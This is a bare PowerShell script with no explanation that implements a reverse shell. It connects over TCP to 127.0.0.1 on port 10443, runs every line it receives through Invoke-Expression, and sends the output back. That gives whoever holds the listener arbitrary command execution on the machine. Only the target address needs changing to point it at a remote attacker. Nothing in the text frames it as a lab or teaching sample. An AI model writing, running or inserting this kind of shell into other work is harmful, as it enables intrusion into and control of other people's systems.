$socket = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 10443)
$stream = $socket.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$encoding = New-Object System.Text.AsciiEncoding

while ($true) {
    $line = $reader.ReadLine()
    $cmd = Invoke-Expression -Command $line 2>&1
    $output = $cmd | Out-String
    $writer.WriteLine($output)
    $writer.Flush()
}

$reader.Close()
$writer.Close()
$socket.Close()
